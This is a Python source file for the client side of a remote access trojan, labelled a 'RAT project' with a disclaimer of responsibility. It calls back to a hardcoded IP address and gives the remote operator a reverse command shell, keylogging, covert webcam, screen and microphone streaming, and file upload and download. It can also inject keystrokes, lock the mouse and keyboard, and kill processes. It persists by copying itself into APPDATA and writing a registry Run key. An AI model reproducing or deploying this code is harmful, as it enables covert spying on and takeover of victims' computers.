# Python RAT project by average-joe44
# Does NOT Responsible for any use case!

import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
import threading
from Logger import Keylogger
import cv2
import pickle
import struct
import pyautogui
import shutil
import pyaudio 
from pynput.keyboard import Key, Controller
from pynput import keyboard
from mss import mss
import numpy as np
import psutil
from filetarget import download_file, upload_file

ip = '192.168.18.198'
main_log1 = threading.Event()
is_locked_cursor = False
is_locked_keyboard = False

def get_pid(sok):
    try:
        sok.settimeout(3.0)
        cur_pid = os.getpid()
        cur_pid = str(cur_pid).encode()
        sok.sendall(cur_pid)
    except:
        return

def lock_cursor():
    global is_locked_cursor

    while True:
        if is_locked_cursor:
            x, y = pyautogui.position()

            while is_locked_cursor:
                pyautogui.moveTo(x, y)
                time.sleep(0.005)
        time.sleep(0.1)

def lock_keyboard():
    global is_locked_keyboard
    block_keyboard = None

    while True:
        if is_locked_keyboard and block_keyboard is None:
            block_keyboard = keyboard.Listener(suppress=True)
            block_keyboard.start()

        elif not is_locked_keyboard and block_keyboard is not None:
            block_keyboard.stop()
            block_keyboard = None

        time.sleep(0.1)

def thread_lock_cursor():
    lcu = threading.Thread(target=lock_cursor, daemon=True)
    lcu.start()

def thread_lock_keyboard():
    lkb = threading.Thread(target=lock_keyboard, daemon=True)
    lkb.start()

thread_lock_cursor()
thread_lock_keyboard()

def move_cursor(sok):
    global is_locked_cursor, is_locked_keyboard
    try:
        pyautogui.FAILSAFE = False
        sok.settimeout(3.0)

        soket = sok.makefile('r')
        data = soket.readline()

        if not data:
            return

        data = data.strip()

        if data == "invalid":
            sok.sendall(b"[-] Invalid value")
            return

        if data == "rclick":
            pyautogui.rightClick()
            sok.sendall(b"[+] Done")
            return
        
        elif data == "lclick":
            pyautogui.leftClick()
            sok.sendall(b"[+] Done")
            return
        
        elif data == "unlock cursor":
            is_locked_cursor = False
            sok.sendall(b"[+] Cursor is unlocked")
            return
            
        elif data == "lock cursor":
            is_locked_cursor = True
            sok.sendall(b"[+] Cursor is locked")
            return

        elif data == "unlock keyboard":
            is_locked_keyboard = False
            sok.sendall(b"[+] Keyboard is unlocked")
            return

        elif data == "lock keyboard":
            is_locked_keyboard = True
            sok.sendall(b"[+] Keyboard is locked")
            return
            
        if "," not in data:
            return
        
        data = data.split(",")
        if len(data) == 2:
            x = int(data[0])
            y = int(data[1])
            pyautogui.move(x, y)
            sok.sendall(f"[+] Moved cursor by {x}, {y}".encode())
    except:
        return
    finally:
        sok.settimeout(None)

def start_log():
    Keylogger().start_log()
    main_log1.set()

def baca_log(sok):
    if not main_log1.is_set():
        return

    open(sok)

def stop_log():
    Keylogger().stop_listener()

def open(sok):
    sok.sendall(Keylogger().baca_log().encode())

def change_directory(cmd, sok):
    try:
        os.chdir(cmd)
        cur_dir = os.getcwd()
        sok.sendall(f"{cur_dir}".encode())
    except:
        sok.sendall("Can't change directory".encode())
        pass

def screen_shot(sok):
    ss = pyautogui.screenshot()
    ss.save('ss.png')
    upload_file(sok,'ss.png')
    os.remove("ss.png")

def execute(sok, cmd):
    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_PROCESS_GROUP = 0x00000200
    CREATE_NO_WINDOW = 0x08000000

    flag = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
    
    try:
        cmd = cmd.strip()
        if not cmd:
            sok.sendall(b"[-] Wrong value\n")
            return
        subprocess.Popen(cmd, creationflags=flag, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

        sok.sendall(b"[+] Process created\n")
    except Exception as e:
        sok.sendall(f"[-] Error: {e}\n".encode())
    return
    
def kill(sok, cmd):
    found = False
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() in cmd:
                proc.kill()
                found = True
        except (psutil.ZombieProcess, psutil.AccessDenied, psutil.NoSuchProcess, Exception):
            continue
    if not found:
        sok.sendall(b"[-] No such process found\n")
    else:
        sok.sendall(b"[+] Process killed\n")
    return
    
def pidkill(sok, cmd):
    try:
        cmd = int(cmd)
        proc = psutil.Process(cmd)
        proc.kill()
        sok.sendall(b"[+] Process killed\n")
    except (psutil.ZombieProcess, psutil.AccessDenied, psutil.NoSuchProcess, ValueError, Exception):
        sok.sendall(b"[-] No such process found\n")
    return
    
def send_camera_image(ip, port=9999):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        return

    _, img_encoded = cv2.imencode(".jpg", frame)
    data = img_encoded.tobytes()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))

    client.sendall(struct.pack("!I", len(data)))
    client.sendall(data)

    client.close()

keyb = Controller()
def acc_keystroke():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 9995))
        while True:
            data = s.recv(1024)
            if not data:
                break
            command = data.decode()
            try:
                if command.lower() == 'enter':
                    keyb.press(Key.enter)
                    keyb.release(Key.enter)
                if command.lower() == 'space':
                    keyb.press(Key.space)
                    keyb.release(Key.space)
                else:
                    keyb.type(command)
            except Exception as e:
                print(f'{e}')
                break
            

FORMAT = pyaudio.paInt16
CHANNEL = 1
RATE = 44100
CHUNK = 1024

def record_n_send():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNEL,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    print('Recording')
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, 9996))
            for _ in range(0, int(RATE / CHUNK * 20)):
                data = stream.read(CHUNK)
                s.sendall(data)
            print('Record done')
    except socket.error as e:
        print(f'{e}')
    finally:
        print('done')
        stream.stop_stream()
        stream.close()
        audio.terminate()

def run_persistence(nama_registry, file_exe):
    CREATE_NEW_PROC = 0x00000010
    file_path = os.environ['appdata']+'\\'+file_exe
    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
        subprocess.Popen([file_path], creationflags=CREATE_NEW_PROC, stdin=None, stderr=None, stdout=None)
    except SystemExit:
        raise
    except:
        pass
    finally:
        sys.exit(0)
    
def send_screen_record(ip, port=9991,):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    client.connect((ip, port))

    quality = 70
    sct = mss()
    monitor = sct.monitors[1]

    target_buf_size = 1280

    while True:
        try:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)

            h, w = frame.shape[:2]
            if w > target_buf_size:
                new_h = int(target_buf_size * h / w)
                frame = cv2.resize(frame, (target_buf_size, new_h), interpolation=cv2.INTER_AREA)

            encode = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
            res, encoded = cv2.imencode('.jpg', frame, encode)

            data = encoded.tobytes()
            size = struct.pack("Q", len(data))

            client.sendall(size + data)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        except Exception as e:
            print(f'{e}')
            break

    client.close()
    
def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, 9998))
        vid = cv2.VideoCapture(0)
        while vid.isOpened:
            img, frame = vid.read()
            if not img:
                break
            try:
                b = pickle.dumps(frame)
                message = struct.pack("Q", len(b))+b
                sock.sendall(message)
            except (BrokenPipeError, ConnectionResetError, OSError):
                break
    except Exception:
            pass
    finally:
        try: sock.close()
        except: pass
    vid.release()
    cv2.destroyAllWindows()

def record_n_stream():
    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNEL,
                    rate=RATE,
                    input=True,
                    output=False,
                    frames_per_buffer=CHUNK)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((ip, 781))
        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            sock.sendall(data)
    except Exception as e:
        print()
    finally:
        sock.close()
        stream.stop_stream()
        stream.close()
        p.terminate()

def terima_perintah(sok):
    data = ''
    while True:
        try:
            data = data + sok.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except socket.timeout:
            continue

def jalankan_perintah(sok):
    while True:
        perintah = terima_perintah(sok)
        if perintah in ('exit', 'quit'):
            sys.exit()
        if perintah in ('background', 'bg'):
            break
        elif perintah == 'clear':
            pass
        elif perintah[:3] == 'cd ':
            change_directory(perintah[3:], sok)
        elif perintah[:8] == 'download':
            upload_file(sok, perintah[9:])
        elif perintah[:6] == 'upload':
            download_file(sok, perintah[7:])
        elif perintah == 'start_log':
            start_log()
        elif perintah == 'baca_log':
            baca_log(sok)
        elif perintah == 'stop_log':
            stop_log()
            stop_log()
            main_log1.clear()
        elif perintah == 'start_cam':
            byte_stream()
        elif perintah == 'screen_shot':
            screen_shot(sok)
        elif perintah == 'screen_share':
            send_screen_record(ip=ip, port=9991)
        elif perintah[:11] == 'persistence':
            nama_registry, file_exe = perintah[12:].split(' ')
            run_persistence(nama_registry, file_exe)
        elif perintah == 'help':
            pass
        elif perintah == 'rec_audio':
            record_n_send()
        elif perintah == 'live_audio':
            record_n_stream()
        elif perintah == 'send_key':
            acc_keystroke()
        elif perintah == 'snap_cam':
            send_camera_image(ip=ip, port=9993)
        elif perintah[:7] == 'execute':
            execute(sok, perintah[8:])
        elif perintah[:4] == 'kill':
            kill(sok, perintah[5:])
        elif perintah[:7] == 'pidkill':
            pidkill(sok, perintah[8:])
        elif perintah.startswith("move"):
            move_cursor(sok)
        elif perintah == "rclick":
            move_cursor(sok)
        elif perintah == "lclick":
            move_cursor(sok)
        elif perintah == "getpid":
            get_pid(sok)
        elif perintah.startswith("ui"):
            move_cursor(sok)
        else:
            exe = subprocess.Popen(
            perintah,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE
        )
            data =exe.stdout.read() + exe.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sok.send(output.encode())

def execute_persist():
    while True:
        sok = None
        try:
            sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sok.settimeout(5.0)
            res = sok.connect_ex((ip, 9999))
            if res == 0:
                sok.settimeout(None)
                sok.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                jalankan_perintah(sok)
        except Exception:
            pass
        finally:
            if sok:
                try:
                    sok.close()
                except:
                    pass
            time.sleep(3)

execute_persist()
